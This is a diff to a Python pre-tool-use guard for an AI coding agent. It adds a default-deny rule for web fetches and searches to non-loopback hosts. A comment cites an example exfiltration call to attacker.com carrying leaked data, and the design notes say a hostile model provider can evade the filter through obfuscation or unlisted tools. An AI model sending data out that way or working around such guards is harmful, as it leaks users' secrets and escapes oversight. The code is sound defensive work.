@@ -28,6 +28,12 @@ Design notes / philosophy
   wipes, and cloud-metadata SSRF. It deliberately leaves ordinary development
   work alone (``git commit``, ``pytest``, ``npm test``, ``pip install <pkg>``,
   reading and editing project source, ``curl`` against loopback, ...).
+* By default, ``WebFetch``/``WebSearch`` are denied against any **non-loopback**
+  host -- this is the one rule that is deliberately broader than "high-signal
+  dangerous", because an outbound fetch to an attacker-chosen host is exactly
+  how a compromised provider exfiltrates data on a bare-host (non-containerized)
+  run. It is configurable: ``FCC_WEBFETCH_ALLOW_HOSTS`` allowlists specific
+  hosts/suffixes, and ``FCC_ALLOW_WEB_FETCH=1`` disables the rule entirely.
 * It is a heuristic regex filter over tool-call JSON, **not** a shell parser, a
   taint tracker, or a sandbox. A motivated adversarial provider can construct a
   command that evades it (indirection, obfuscation, an unlisted tool). The real
@@ -38,11 +44,14 @@ Design notes / philosophy
   bug would be worse than the residual risk this best-effort layer covers.
 """
 
+import ipaddress
 import json
+import os
 import re
 import sys
 from collections.abc import Mapping
 from dataclasses import dataclass
+from urllib.parse import urlparse
 
 from free_claude_code.core.json_types import JsonObject, JsonValue
 
@@ -211,7 +220,81 @@ _SSRF_RE = re.compile(
 
 
 # --------------------------------------------------------------------------- #
-# (3) Bash: network / transfer tooling (exfiltration).                         #
+# (3) WebFetch/WebSearch: default-deny fetches to a non-loopback host.         #
+#     Closes the "web_fetch GET attacker.com/?leak=<data>" exfiltration        #
+#     channel on a bare-host (non-containerized) run. Configurable via env:    #
+#     an allowlist of hosts/suffixes, or a full opt-out for users who accept   #
+#     the risk.                                                                #
+# --------------------------------------------------------------------------- #
+WEBFETCH_ALLOW_HOSTS_ENV = "FCC_WEBFETCH_ALLOW_HOSTS"
+WEBFETCH_ALLOW_ENV = "FCC_ALLOW_WEB_FETCH"
+_ENV_TRUTHY = frozenset({"1", "true", "yes", "on"})
+_LOOPBACK_HOST_NAMES = frozenset({"localhost"})
+
+
+def _webfetch_lockdown_disabled(env: Mapping[str, str]) -> bool:
+    return env.get(WEBFETCH_ALLOW_ENV, "").strip().lower() in _ENV_TRUTHY
+
+
+def _webfetch_allowed_hosts(env: Mapping[str, str]) -> frozenset[str]:
+    raw = env.get(WEBFETCH_ALLOW_HOSTS_ENV, "")
+    return frozenset(host.strip().lower() for host in raw.split(",") if host.strip())
+
+
+def _host_is_loopback(host: str) -> bool:
+    normalized = host.strip().lower().strip("[]")
+    if normalized in _LOOPBACK_HOST_NAMES:
+        return True
+    try:
+        return ipaddress.ip_address(normalized).is_loopback
+    except ValueError:
+        return False
+
+
+def _host_is_allowlisted(host: str, allow_hosts: frozenset[str]) -> bool:
+    normalized = host.strip().lower()
+    return any(
+        normalized == allowed or normalized.endswith(f".{allowed}")
+        for allowed in allow_hosts
+    )
+
+
+def _evaluate_web_fetch_host(
+    tool_name: str, tool_input: Mapping[str, JsonValue], env: Mapping[str, str]
+) -> GuardDecision | None:
+    """Return a deny decision if a WebFetch/WebSearch call targets a non-
+    loopback host, or None ("no opinion") if the lockdown does not apply.
+
+    ``WebFetch`` carries the target in ``url``; its host is extracted with
+    ``urlparse``. ``WebSearch`` has no caller-specified host at all -- a
+    search inherently reaches an external backend -- so it is denied by
+    default unless the rule is disabled outright.
+    """
+
+    if _webfetch_lockdown_disabled(env):
+        return None
+
+    url = _as_str(tool_input.get("url"))
+    host = urlparse(url).hostname if url else None
+
+    if host is not None:
+        if _host_is_loopback(host):
+            return None
+        if _host_is_allowlisted(host, _webfetch_allowed_hosts(env)):
+            return None
+
+    target = host if host else "a remote host"
+    return _deny(
+        "exfiltration",
+        f"{tool_name} targets {target}, a non-loopback host, which is denied "
+        f"by default to prevent data exfiltration. Set {WEBFETCH_ALLOW_HOSTS_ENV} "
+        "(comma-separated hostnames/suffixes) to allow specific hosts, or "
+        f"{WEBFETCH_ALLOW_ENV}=1 to disable this rule entirely.",
+    )
+
+
+# --------------------------------------------------------------------------- #
+# (4) Bash: network / transfer tooling (exfiltration).                         #
 # --------------------------------------------------------------------------- #
 _LOOPBACK_RE = re.compile(r"(?:127\.0\.0\.1|localhost|::1|\[::1\]|0\.0\.0\.0)")
 # Tools that are network operations by nature (safe to flag on mere presence).
@@ -399,13 +482,24 @@ _BASH_RULES: tuple[_Rule, ...] = _rules(
 )
 
 
-def evaluate(tool_name: str, tool_input: Mapping[str, JsonValue]) -> GuardDecision:
+def evaluate(
+    tool_name: str,
+    tool_input: Mapping[str, JsonValue],
+    env: Mapping[str, str] | None = None,
+) -> GuardDecision:
     """Return the guard decision for one tool call.
 
     This is the pure decision core exercised by the unit tests. ``main`` is a
     thin stdin/stdout shell around it.
+
+    ``env`` supplies the process environment consulted by env-configurable
+    rules (currently the WebFetch/WebSearch host lockdown). It defaults to an
+    empty mapping -- not ``os.environ`` -- so this function stays a pure,
+    deterministic decision core; the stdin/stdout boundary
+    (``evaluate_hook_payload``) is what wires in the real environment.
     """
 
+    effective_env = env if env is not None else {}
     scan_text = _scan_target(tool_name, tool_input)
 
     # (1) Secret file access -- every matched tool.
@@ -430,7 +524,13 @@ def evaluate(tool_name: str, tool_input: Mapping[str, JsonValue]) -> GuardDecisi
             "targets a cloud instance-metadata endpoint (credential theft via SSRF)",
         )
 
-    # (3) Bash-only command patterns.
+    # (3) WebFetch/WebSearch -- default-deny a non-loopback host.
+    if tool_name == "WebFetch" or tool_name == "WebSearch":
+        decision = _evaluate_web_fetch_host(tool_name, tool_input, effective_env)
+        if decision is not None:
+            return decision
+
+    # (4) Bash-only command patterns.
     if tool_name == "Bash":
         return _evaluate_bash(_as_str(tool_input.get("command")))
 
@@ -522,8 +622,16 @@ def _as_str(value: JsonValue | None) -> str:
 # --------------------------------------------------------------------------- #
 # stdin/stdout entry point.                                                    #
 # --------------------------------------------------------------------------- #
-def evaluate_hook_payload(raw: str) -> GuardDecision:
-    """Parse a raw ``PreToolUse`` stdin payload and evaluate it (fail-open)."""
+def evaluate_hook_payload(
+    raw: str, env: Mapping[str, str] | None = None
+) -> GuardDecision:
+    """Parse a raw ``PreToolUse`` stdin payload and evaluate it (fail-open).
+
+    ``env`` defaults to the real process environment (``os.environ``) -- this
+    is the IO boundary that wires env-configurable rules (the WebFetch host
+    lockdown) to the user's actual ``FCC_WEBFETCH_ALLOW_HOSTS`` /
+    ``FCC_ALLOW_WEB_FETCH`` settings.
+    """
 
     try:
         parsed: JsonValue = json.loads(raw)
@@ -535,9 +643,10 @@ def evaluate_hook_payload(raw: str) -> GuardDecision:
     if not isinstance(tool_name, str):
         return _ALLOW
     tool_input = parsed.get("tool_input")
+    effective_env = env if env is not None else os.environ
     if not isinstance(tool_input, dict):
-        return evaluate(tool_name, {})
-    return evaluate(tool_name, tool_input)
+        return evaluate(tool_name, {}, env=effective_env)
+    return evaluate(tool_name, tool_input, env=effective_env)
 
 
 def render_deny_output(decision: GuardDecision) -> JsonObject:
